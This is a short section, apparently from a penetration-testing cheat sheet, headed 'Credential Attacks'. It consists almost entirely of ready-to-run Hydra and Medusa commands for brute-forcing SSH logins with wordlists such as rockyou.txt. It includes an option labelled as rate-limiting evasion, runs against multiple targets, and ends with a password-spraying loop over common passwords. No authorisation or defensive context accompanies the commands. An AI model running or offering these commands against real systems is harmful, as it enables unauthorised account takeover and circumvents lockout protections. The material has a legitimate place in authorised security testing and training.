# Phase 4: Credential Attacks

#### Brute-Force with Hydra

```bash
# Single username, password list
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.100

# Username list, single password
hydra -L users.txt -p Password123 ssh://192.168.1.100

# Username and password lists
hydra -L users.txt -P passwords.txt ssh://192.168.1.100

# With specific port
hydra -l admin -P passwords.txt -s 2222 ssh://192.168.1.100

# Rate limiting evasion (slow)
hydra -l admin -P passwords.txt -t 1 -w 5 ssh://192.168.1.100

# Verbose output
hydra -l admin -P passwords.txt -vV ssh://192.168.1.100

# Exit on first success
hydra -l admin -P passwords.txt -f ssh://192.168.1.100
```

#### Brute-Force with Medusa

```bash
# Basic brute-force
medusa -h 192.168.1.100 -u admin -P passwords.txt -M ssh

# Multiple targets
medusa -H targets.txt -u admin -P passwords.txt -M ssh

# With username list
medusa -h 192.168.1.100 -U users.txt -P passwords.txt -M ssh

# Specific port
medusa -h 192.168.1.100 -u admin -P passwords.txt -M ssh -n 2222
```

#### Password Spraying

```bash
# Test common password across users
hydra -L users.txt -p Summer2024! ssh://192.168.1.100

# Multiple common passwords
for pass in "Password123" "Welcome1" "Summer2024!"; do
    hydra -L users.txt -p "$pass" ssh://192.168.1.100
done
```